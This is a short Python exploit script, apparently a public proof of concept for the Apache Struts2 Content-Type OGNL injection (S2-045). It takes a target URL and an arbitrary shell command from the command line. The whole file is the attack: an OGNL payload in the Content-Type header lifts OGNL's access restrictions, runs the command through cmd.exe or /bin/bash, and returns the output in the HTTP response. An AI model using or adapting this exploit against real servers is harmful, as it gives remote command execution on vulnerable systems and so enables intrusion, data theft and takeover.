#! /usr/bin/env python
# encoding:utf-8
# yaoyi2008

import sys
import requests
import httplib

httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'

url = str(sys.argv[1])
cmd = str(sys.argv[2])
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Content-Type': "%{(#nike='multipart/form-data'). (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS). (#_memberAccess?(#_memberAccess=#dm): ((#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "'). (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))). (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})). (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)). (#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse(). getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)). (#ros.flush())}",
    'Accept-Language': "zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4",
}

r = requests.post(url, headers=headers, verify=False)

print(r.text)
